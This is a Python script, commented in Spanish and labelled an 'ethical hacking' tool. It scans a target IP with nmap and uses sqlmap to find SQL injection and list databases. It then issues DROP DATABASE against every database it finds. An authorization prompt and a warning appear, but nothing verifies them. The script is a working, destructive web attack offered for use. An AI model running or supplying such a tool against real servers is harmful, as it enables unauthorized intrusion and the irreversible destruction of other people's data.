#!/usr/bin/env python3
import subprocess
import argparse
import sys
import re
import ipaddress
import logging
from datetime import datetime

def setup_logging():
    """Configura el registro de logs."""
    logging.basicConfig(
        filename=f"ethical_hack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )

def run_command(command):
    """Ejecuta un comando en la terminal y devuelve la salida."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
        logging.info(f"Comando ejecutado: {command}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Error ejecutando comando: {command}. Detalle: {e.stderr}")
        print(f"[-] Error ejecutando comando: {e.stderr}")
        return None

def validate_ip(ip):
    """Valida que la IP sea correcta."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        logging.error(f"IP inválida: {ip}")
        print(f"[-] La IP {ip} no es válida.")
        return False

def validate_port(port):
    """Valida que el puerto sea válido."""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return True
        else:
            logging.error(f"Puerto inválido: {port}")
            print(f"[-] El puerto {port} no es válido (debe estar entre 1 y 65535).")
            return False
    except ValueError:
        logging.error(f"Puerto no numérico: {port}")
        print(f"[-] El puerto {port} no es válido (debe ser un número).")
        return False

def scan_ip(ip, port):
    """Escanea la IP y el puerto con nmap para detectar servicios web."""
    if not validate_ip(ip) or not validate_port(port):
        return False

    print(f"[*] Escaneando IP: {ip} en el puerto: {port}")
    logging.info(f"Escaneando IP: {ip} en el puerto: {port}")
    nmap_command = f"nmap -sV -p {port} {ip}"
    output = run_command(nmap_command)
    if output:
        print("[+] Resultado del escaneo:")
        print(output)
        logging.info(f"Resultado del escaneo: {output}")
        if f"{port}/tcp" in output and ("http" in output.lower() or "https" in output.lower()):
            return True
    print(f"[-] No se encontraron servicios web en {ip}:{port}.")
    logging.warning(f"No se encontraron servicios web en {ip}:{port}.")
    return False

def check_sql_vuln(ip, port):
    """Usa sqlmap para buscar vulnerabilidades de inyección SQL."""
    print(f"[*] Buscando vulnerabilidades SQL en {ip}:{port}")
    logging.info(f"Buscando vulnerabilidades SQL en {ip}:{port}")
    protocol = "https" if port in ["443", "8443"] else "http"
    base_url = f"{protocol}://{ip}:{port}"
    sqlmap_command = f"sqlmap -u {base_url} --crawl=3 --batch --dbs"
    output = run_command(sqlmap_command)
    if output and "available databases" in output:
        print("[+] Bases de datos encontradas:")
        print(output)
        logging.info(f"Bases de datos encontradas: {output}")
        return output
    else:
        print("[-] No se encontraron vulnerabilidades SQL.")
        logging.warning("No se encontraron vulnerabilidades SQL.")
        return None

def drop_database(ip, port, db_name):
    """Intenta eliminar una base de datos específica."""
    print(f"[*] Intentando eliminar la base de datos: {db_name}")
    logging.info(f"Intentando eliminar la base de datos: {db_name}")
    protocol = "https" if port in ["443", "8443"] else "http"
    base_url = f"{protocol}://{ip}:{port}"
    db_name = db_name.replace("'", "\\'")
    sqlmap_command = f"sqlmap -u {base_url} --batch -D {db_name} --sql-query='DROP DATABASE {db_name}'"
    output = run_command(sqlmap_command)
    if output and "executed successfully" in output:
        print(f"[+] Base de datos {db_name} eliminada con éxito.")
        logging.info(f"Base de datos {db_name} eliminada con éxito.")
    else:
        print(f"[-] No se pudo eliminar la base de datos {db_name}.")
        logging.error(f"No se pudo eliminar la base de datos {db_name}. Detalle: {output}")
    return output

def show_ethical_warning():
    """Muestra una advertencia sobre el uso ético."""
    warning = """
    [!] ADVERTENCIA: Esta herramienta está diseñada exclusivamente para pruebas de seguridad
    en entornos AUTORIZADOS (como pruebas de penetración legales o sistemas propios).
    El uso no autorizado puede violar leyes locales e internacionales.
    Asegúrate de tener permiso explícito antes de continuar.
    """
    print(warning)
    logging.info("Advertencia ética mostrada al usuario.")
    confirm = input("[!] ¿Confirmas que tienes autorización para realizar estas pruebas? (s/n): ").lower()
    if confirm != 's':
        print("[-] Operación cancelada. No se procederá sin autorización.")
        logging.info("Operación cancelada por falta de confirmación de autorización.")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Herramienta de hacking ético para escanear y eliminar bases de datos en entornos autorizados.")
    parser.add_argument("ip", help="IP de la página web")
    parser.add_argument("port", help="Puerto donde está el servicio web (ej. 80, 443)")
    args = parser.parse_args()

    setup_logging()
    show_ethical_warning()

    if not scan_ip(args.ip, args.port):
        logging.error(f"No se encontraron servicios web en {args.ip}:{args.port}.")
        sys.exit(1)

    sql_output = check_sql_vuln(args.ip, args.port)
    if not sql_output:
        logging.error("No se encontraron vulnerabilidades SQL.")
        sys.exit(1)

    db_pattern = re.compile(r"Database: (\w+)")
    databases = db_pattern.findall(sql_output)
    if not databases:
        print("[-] No se encontraron bases de datos para eliminar.")
        logging.warning("No se encontraron bases de datos para eliminar.")
        sys.exit(1)

    print("[+] Bases de datos disponibles:", databases)
    logging.info(f"Bases de datos disponibles: {databases}")

    confirm = input("[!] ¿Estás seguro de que quieres eliminar TODAS las bases de datos encontradas? (s/n): ").lower()
    if confirm != 's':
        print("[-] Operación cancelada.")
        logging.info("Eliminación cancelada por el usuario.")
        sys.exit(1)

    for db in databases:
        drop_database(args.ip, args.port, db)

if __name__ == "__main__":
    main() 
